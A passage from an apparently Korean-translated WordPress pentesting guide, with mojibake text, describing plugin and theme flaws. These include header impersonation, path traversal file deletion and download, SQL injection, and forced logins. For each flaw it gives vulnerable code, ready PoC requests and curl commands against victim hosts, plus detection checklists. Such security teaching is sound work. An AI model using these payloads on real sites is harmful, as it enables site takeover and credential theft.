> ë˜í•œ, í•¨ìˆ˜ê°€ ë‹¨ì§€ `wp_verify_nonce`ë¡œ ì‚¬ìš©ìì˜ ì¸ì¦ë§Œ í™•ì¸í•˜ê³  ìˆë‹¤ë©´, ì´ í•¨ìˆ˜ëŠ” ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í–ˆëŠ”ì§€ë§Œ í™•ì¸í•  ë¿ ë³´í†µ ì‚¬ìš©ì ì—­í• ì„ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ë‚®ì€ ê¶Œí•œì˜ ì‚¬ìš©ìê°€ ë†’ì€ ê¶Œí•œì˜ ì‘ì—…ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **REST API**

ë˜í•œ `register_rest_route` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ wordpressì˜ í•¨ìˆ˜ë¥¼ REST APIë¡œ ë…¸ì¶œì‹œí‚¤ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback`ëŠ” íŠ¹ì • ì‚¬ìš©ìê°€ API ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ì½œë°± í•¨ìˆ˜ì…ë‹ˆë‹¤.

**ë‚´ì¥ `__return_true` í•¨ìˆ˜ê°€ ì‚¬ìš©ë˜ë©´ ì‚¬ìš©ì ê¶Œí•œ ê²€ì‚¬ë¥¼ ë‹¨ìˆœíˆ ê±´ë„ˆëœë‹ˆë‹¤.**

- **php íŒŒì¼ì— ì§ì ‘ ì ‘ê·¼**

ë¬¼ë¡ , WordpressëŠ” PHPë¥¼ ì‚¬ìš©í•˜ë©° í”ŒëŸ¬ê·¸ì¸ ë‚´ë¶€ì˜ íŒŒì¼ì€ ì›¹ì—ì„œ ì§ì ‘ ì ‘ê·¼ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ í”ŒëŸ¬ê·¸ì¸ì´ íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ì·¨ì•½í•œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ë©´ ëª¨ë“  ì‚¬ìš©ìê°€ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ ë‚´ë¶€ í†µí•©ì´ë‚˜ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œë¥¼ ìœ„í•œ â€œtrusted headerâ€ ë‹¨ì¶•í‚¤ë¥¼ êµ¬í˜„í•œ ë‹¤ìŒ í•´ë‹¹ í—¤ë”ë¥¼ ì‚¬ìš©í•´ REST ìš”ì²­ì˜ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ë§Œì•½ í•´ë‹¹ í—¤ë”ê°€ ì—…ìŠ¤íŠ¸ë¦¼ êµ¬ì„±ìš”ì†Œì— ì˜í•´ ì•”í˜¸í•™ì ìœ¼ë¡œ ìš”ì²­ì— ë°”ì¸ë”©ë˜ì–´ ìˆì§€ ì•Šë‹¤ë©´, ê³µê²©ìëŠ” ì´ë¥¼ ìŠ¤í‘¸í•‘í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì˜ REST ê²½ë¡œì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì˜í–¥: ì¸ì¦ë˜ì§€ ì•Šì€ ìƒíƒœì—ì„œ core users REST routeë¥¼ í†µí•´ ìƒˆ ê´€ë¦¬ì ê³„ì •ì„ ìƒì„±í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œ ìƒìŠ¹ìœ¼ë¡œ ì´ì–´ì§.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1ì„ ê°•ì œë¡œ ì„¤ì •, ì¼ë°˜ì ìœ¼ë¡œ ì²« ë²ˆì§¸ ê´€ë¦¬ì ê³„ì •).
- ì•…ìš©ëœ ê²½ë¡œ: `POST /wp-json/wp/v2/users` â€” ê¶Œí•œì´ ìƒìŠ¹ëœ role ë°°ì—´ê³¼ í•¨ê»˜.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ì‘ë™ ì›ë¦¬

- í”ŒëŸ¬ê·¸ì¸ì´ í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” í—¤ë”ë¥¼ ì¸ì¦ ìƒíƒœë¡œ ë§¤í•‘í•˜ê³  ê¶Œí•œ ê²€ì‚¬ë¥¼ ê±´ë„ˆë›´ë‹¤.
- WordPress coreëŠ” ì´ ê²½ë¡œì— ëŒ€í•´ `create_users` ê¶Œí•œì„ ê¸°ëŒ€í•œë‹¤; í”ŒëŸ¬ê·¸ì¸ ìš°íšŒëŠ” í—¤ë”ì—ì„œ ì§ì ‘ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ì—¬ ì´ë¥¼ ìš°íšŒí•œë‹¤.

ì„±ê³µ ì§€í‘œ (ì˜ˆìƒ)

- ìƒì„±ëœ ì‚¬ìš©ìë¥¼ ì„¤ëª…í•˜ëŠ” JSON ë³¸ë¬¸ê³¼ í•¨ê»˜ HTTP 201 ì‘ë‹µ.
- `wp-admin/users.php`ì—ì„œ ë³´ì´ëŠ” ìƒˆë¡œìš´ ê´€ë¦¬ì ì‚¬ìš©ì.

íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

- ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ ì»¤ìŠ¤í…€ í—¤ë”ë¥¼ ì½ëŠ” `getallheaders()`, `$_SERVER['HTTP_...']` ë˜ëŠ” ë²¤ë” SDKë¥¼ grep í•˜ë¼ (ì˜ˆ: `wp_set_current_user()`, `wp_set_auth_cookie()`).
- ìš”ì²­ í—¤ë”ì— ì˜ì¡´í•˜ê³  ì¶©ë¶„í•œ `permission_callback` ê²€ì‚¬ê°€ ì—†ëŠ” ê¶Œí•œ ìˆëŠ” ì½œë°±ì— ëŒ€í•œ REST ë“±ë¡ì„ ê²€í† í•˜ë¼.
- REST í•¸ë“¤ëŸ¬ ë‚´ë¶€ì—ì„œ í—¤ë” ê°’ë§Œìœ¼ë¡œ ì ‘ê·¼ì´ í†µì œë˜ëŠ” í•µì‹¬ ì‚¬ìš©ì ê´€ë¦¬ í•¨ìˆ˜(`wp_insert_user`, `wp_create_user`) ì‚¬ìš©ì„ ì°¾ì•„ë¼.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress í…Œë§ˆì™€ í”ŒëŸ¬ê·¸ì¸ì€ `wp_ajax_` ë° `wp_ajax_nopriv_` í›…ì„ í†µí•´ AJAX í•¸ë“¤ëŸ¬ë¥¼ ìì£¼ ë…¸ì¶œì‹œí‚¨ë‹¤. **_nopriv_** ë³€í˜•ì´ ì‚¬ìš©ë˜ë©´ **ì½œë°±ì´ ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìë„ ì ‘ê·¼ ê°€ëŠ¥í•´ì§„ë‹¤**, ë”°ë¼ì„œ ë¯¼ê°í•œ ë™ì‘ì€ ì¶”ê°€ë¡œ ë‹¤ìŒì„ êµ¬í˜„í•´ì•¼ í•œë‹¤:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

Litho ë©€í‹°í¼í¬ìŠ¤ í…Œë§ˆ (< 3.1)ëŠ” *Remove Font Family* ê¸°ëŠ¥ì—ì„œ ì´ 3ê°€ì§€ í†µì œë¥¼ ìŠì–´ ì•„ë˜ì™€ ê°™ì€ ì½”ë“œë¥¼ ë°°í¬í–ˆë‹¤ (ë‹¨ìˆœí™”ë¨):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** â€“ ì–´ë–¤ ë°©ë¬¸ìë“  ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **No path sanitisation** â€“ ì‚¬ìš©ì ì œì–´ `fontfamily` ë¬¸ìì—´ì´ í•„í„°ë§ ì—†ì´ íŒŒì¼ ì‹œìŠ¤í…œ ê²½ë¡œì— ì—°ê²°ë˜ì–´ ê³ ì „ì ì¸ `../../` traversalì„ í—ˆìš©í•©ë‹ˆë‹¤.

#### Exploitation

ê³µê²©ìëŠ” ë‹¨ì¼ HTTP POST requestë¥¼ ë³´ë‚´ **below the uploads base directory** (ë³´í†µ `<wp-root>/wp-content/uploads/`)ì— ìˆëŠ” ì–´ë–¤ íŒŒì¼ì´ë‚˜ ë””ë ‰í„°ë¦¬ë¼ë„ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *ì„¤ì¹˜ ë§ˆë²•ì‚¬* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* ê²½ë¡œì— ë¹„ê²€ì¦ ì‚¬ìš©ì ì…ë ¥ì„ ì´ì–´ë¶™ì´ëŠ” ê²½ìš°(`$_POST`, `$_GET`, `$_REQUEST` í™•ì¸).
* `check_ajax_referer()` ë° `current_user_can()`/`is_user_logged_in()`ì˜ ë¶€ì¬.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ì™œ ì´ ì·¨ì•½ì ì´ ì•…ìš© ê°€ëŠ¥í•œê°€

- `$_REQUEST['reset-for']`ì™€ í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ì„ server-side authorization ì—†ì´ ì‹ ë¢°í•¨.
- `_asenha_view_admin_as_original_roles`ì— ì´ì „ì— ë” ë†’ì€ ê¶Œí•œì´ ì €ì¥ë˜ì–´ ìˆì—ˆê³  ì‚¬ìš©ìê°€ í•˜í–¥ ì¡°ì •ëœ ê²½ìš°, reset ê²½ë¡œë¥¼ í˜¸ì¶œí•˜ì—¬ í•´ë‹¹ ê¶Œí•œì„ ë³µì›í•  ìˆ˜ ìˆìŒ.
- ì¼ë¶€ ë°°í¬ í™˜ê²½ì—ì„œëŠ”, any authenticated userê°€ `viewing_admin_as_role_are`ì— ì—¬ì „íˆ ì¡´ì¬í•˜ëŠ” ë‹¤ë¥¸ usernameì— ëŒ€í•œ resetì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŒ (ê¶Œí•œ ê²€ì¦ ì‹¤íŒ¨).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ì·¨ì•½í•œ ë¹Œë“œì—ì„œëŠ” ì´ ë™ì‘ì´ í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  ì €ì¥ëœ ì›ë˜ ì—­í• (ì˜ˆ: `administrator`)ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ì—¬ ì‹¤ì§ˆì ìœ¼ë¡œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.

Detection checklist

- ì‚¬ìš©ì ë©”íƒ€ì— â€œoriginal rolesâ€ë¥¼ ì €ì¥í•˜ëŠ” ì—­í•  ì „í™˜ ê¸°ëŠ¥(ì˜ˆ: `_asenha_view_admin_as_original_roles`)ì„ ì°¾ìœ¼ì„¸ìš”.
- ë‹¤ìŒê³¼ ê°™ì€ ë¦¬ì…‹/ë³µì› ê²½ë¡œë¥¼ ì‹ë³„í•˜ì„¸ìš”:
  - ì‚¬ìš©ì ì´ë¦„ì„ `$_REQUEST` / `$_GET` / `$_POST`ì—ì„œ ì½ìŠµë‹ˆë‹¤.
  - `current_user_can()` ë° `wp_verify_nonce()` / `check_admin_referer()` ì—†ì´ `add_role()` / `remove_role()`ë¡œ ì—­í• ì„ ìˆ˜ì •í•©ë‹ˆë‹¤.
  - í–‰ìœ„ìì˜ ê¶Œí•œ(capabilities) ëŒ€ì‹  í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ ë°°ì—´(ì˜ˆ: `viewing_admin_as_role_are`)ì— ê¸°ë°˜í•´ ê¶Œí•œì„ ë¶€ì—¬í•©ë‹ˆë‹¤.

---

### ê³µê°œ initì—ì„œ ì¿ í‚¤ ê¸°ë°˜ ì‹ ë¢° ì‚¬ìš©ì ì „í™˜ì„ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ ê¶Œí•œ ìƒìŠ¹ (Service Finder â€œsf-bookingâ€)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ ì‚¬ìš©ì ì „í™˜ í—¬í¼ë¥¼ ê³µê°œ `init` í›…ì— ì—°ê²°í•˜ê³  í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” ì¿ í‚¤ì—ì„œ ì‹ ì›ì„ ìœ ë„í•©ë‹ˆë‹¤. ì½”ë“œê°€ ì¸ì¦, ê¶Œí•œ(capability) ë° ìœ íš¨í•œ nonceë¥¼ ê²€ì¦í•˜ì§€ ì•Šê³  `wp_set_auth_cookie()`ë¥¼ í˜¸ì¶œí•˜ë©´, ì–´ë–¤ ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìë„ ì„ì˜ì˜ ì‚¬ìš©ì IDë¡œ ê°•ì œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ì™œ ì·¨ì•½í•œê°€

- ê³µê°œëœ `init` hookìœ¼ë¡œ ì¸í•´ í•¸ë“¤ëŸ¬ê°€ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë„ ì ‘ê·¼ ê°€ëŠ¥í•¨(`is_user_logged_in()` ê°€ë“œ ì—†ìŒ).
- ì‹ë³„ ì •ë³´ëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ ìˆ˜ì • ê°€ëŠ¥í•œ ì¿ í‚¤(`original_user_id`)ì—ì„œ ìœ ë˜í•¨.
- ì§ì ‘ì ì¸ `wp_set_auth_cookie($uid)` í˜¸ì¶œì€ ê¶Œí•œ/nonce ê²€ì‚¬ ì—†ì´ ìš”ì²­ìë¥¼ í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ì‹œí‚´.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

ì¼ë°˜ì ì¸ edge/server WAFëŠ” ë„“ì€ íŒ¨í„´(SQLi, XSS, LFI)ì— ë§ì¶° ì¡°ì •ë©ë‹ˆë‹¤. ë§ì€ ê³ ì˜í–¥ WordPress/plugin ê²°í•¨ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ íŠ¹ì •ì˜ ë¡œì§/ì¸ì¦ ë²„ê·¸ë¡œ, ì—”ì§„ì´ WordPress ë¼ìš°íŠ¸ì™€ plugin ì˜ë¯¸ë¡ ì„ ì´í•´í•˜ì§€ ëª»í•˜ë©´ ì •ìƒ íŠ¸ë˜í”½ì²˜ëŸ¼ ë³´ì…ë‹ˆë‹¤.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

WordPress, plugins, and themesê°€ ìµœì‹ ì¸ì§€ í™•ì¸í•˜ì„¸ìš”. ë˜í•œ ìë™ ì—…ë°ì´íŠ¸ê°€ wp-config.phpì— í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ë˜í•œ, **ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” WordPress í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆë§Œ ì„¤ì¹˜í•˜ì„¸ìš”**.

### ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ê¸°íƒ€ ê¶Œì¥ì‚¬í•­**

- ê¸°ë³¸ **admin** ì‚¬ìš©ì ì œê±°
- **ê°•ë ¥í•œ ë¹„ë°€ë²ˆí˜¸**ì™€ **2FA** ì‚¬ìš©
- ì£¼ê¸°ì ìœ¼ë¡œ ì‚¬ìš©ì **ê¶Œí•œ**ì„ **ê²€í† **
- **ë¡œê·¸ì¸ ì‹œë„ ì œí•œ**ìœ¼ë¡œ Brute Force ê³µê²© ë°©ì§€
- **`wp-admin.php`** íŒŒì¼ ì´ë¦„ì„ ë³€ê²½í•˜ê³  ë‚´ë¶€ ë˜ëŠ” íŠ¹ì • IPì—ì„œë§Œ ì ‘ê·¼ í—ˆìš©


### ì¸ì¦ë˜ì§€ ì•Šì€ SQL Injection (ê²€ì¦ ë¶€ì¡±) (WP Job Portal <= 2.3.2)

WP Job Portal recruitment í”ŒëŸ¬ê·¸ì¸ì€ **savecategory** ì‘ì—…ì„ ë…¸ì¶œì‹œì¼°ê³ , ì´ëŠ” ê²°êµ­ `modules/category/model.php::validateFormData()` ë‚´ë¶€ì—ì„œ ë‹¤ìŒì˜ ì·¨ì•½í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** â€“ `parentid`ê°€ HTTP ìš”ì²­ì—ì„œ ê·¸ëŒ€ë¡œ ë“¤ì–´ì˜µë‹ˆë‹¤.
2. **String concatenation inside the WHERE clause** â€“ `is_numeric()` / `esc_sql()` / prepared statement ì—†ìŒ.
3. **Unauthenticated reachability** â€“ í•´ë‹¹ ì•¡ì…˜ì€ `admin-post.php`ë¥¼ í†µí•´ ì‹¤í–‰ë˜ì§€ë§Œ, ìœ ì¼í•œ ì²´í¬ëŠ” ëˆ„êµ¬ë‚˜ ê³µê°œ í˜ì´ì§€ì—ì„œ ìˆì½”ë“œ `[wpjobportal_my_resumes]`ë¥¼ í†µí•´ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce** (`wp_verify_nonce()`)ë¿ì…ë‹ˆë‹¤.

#### ì•…ìš©

1. ìƒˆ nonce í™•ë³´:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`ë¥¼ ì•…ìš©í•´ ì„ì˜ì˜ SQL ì£¼ì…:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ì‘ë‹µì€ ì£¼ì…ëœ ì¿¼ë¦¬ì˜ ê²°ê³¼ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë³€ê²½í•˜ì—¬ SQLië¥¼ ì…ì¦í•©ë‹ˆë‹¤.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

ë‹¤ë¥¸ ì‘ì—…ì¸ **downloadcustomfile**ì€ path traversalì„ í†µí•´ ë°©ë¬¸ìê°€ ë””ìŠ¤í¬ì˜ **ëª¨ë“  íŒŒì¼**ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆê²Œ í—ˆìš©í–ˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ sinkëŠ” `modules/customfield/model.php::downloadCustomUploadedFile()`ì— ìœ„ì¹˜í•©ë‹ˆë‹¤:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name`ì€ ê³µê²©ìê°€ ì œì–´í•˜ë©° **ê²€ì¦ ì—†ì´** ì—°ê²°ë©ë‹ˆë‹¤. ë‹¤ì‹œ, ìœ ì¼í•œ ê´€ë¬¸ì€ ì´ë ¥ì„œ í˜ì´ì§€ì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce**ì…ë‹ˆë‹¤.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.

## Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)ì„ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ ê³„ì • íƒˆì·¨

ë§ì€ í…Œë§ˆ/í”ŒëŸ¬ê·¸ì¸ì€ admin-ajax.phpë¥¼ í†µí•´ ë…¸ì¶œë˜ëŠ” "social login" í—¬í¼ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ë§Œì•½ unauthenticated AJAX action (wp_ajax_nopriv_...)ì´ provider ë°ì´í„°ê°€ ì—†ì„ ë•Œ í´ë¼ì´ì–¸íŠ¸ê°€ ì œê³µí•œ ì‹ë³„ìë¥¼ ì‹ ë¢°í•˜ê³  wp_set_auth_cookie()ë¥¼ í˜¸ì¶œí•˜ë©´, ì´ëŠ” ì™„ì „í•œ ì¸ì¦ ìš°íšŒê°€ ë©ë‹ˆë‹¤.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why itâ€™s exploitable

- ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥ via admin-ajax.php (wp_ajax_nopriv_â€¦ action).
- ìƒíƒœ ë³€ê²½ ì „ì— nonce/capability checks ì—†ìŒ.
- Missing OAuth/OpenID provider verification; ê¸°ë³¸ ë¶„ê¸°(default branch)ê°€ ê³µê²©ì ì…ë ¥ì„ ìˆ˜ìš©í•¨.
- get_user_by('email', $_POST['id']) ì´í›„ wp_set_auth_cookie($uid)ê°€ í˜¸ì¶œë˜ì–´ ìš”ì²­ìë¥¼ ì„ì˜ì˜ ê¸°ì¡´ ì´ë©”ì¼ ì£¼ì†Œë¡œ ì¸ì¦í•¨.

Exploitation (unauthenticated)

- Prerequisites: ê³µê²©ìê°€ /wp-admin/admin-ajax.phpì— ì ‘ê·¼í•  ìˆ˜ ìˆê³  ìœ íš¨í•œ ì‚¬ìš©ì ì´ë©”ì¼ì„ ì•Œê³  ìˆê±°ë‚˜ ì¶”ì¸¡í•  ìˆ˜ ìˆìŒ.
- providerë¥¼ ì§€ì›ë˜ì§€ ì•ŠëŠ” ê°’ìœ¼ë¡œ ì„¤ì •(ë˜ëŠ” ìƒëµ)í•˜ì—¬ default branchë¥¼ íƒ€ê³  id=<victim_email>ë¥¼ ì „ë‹¬.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

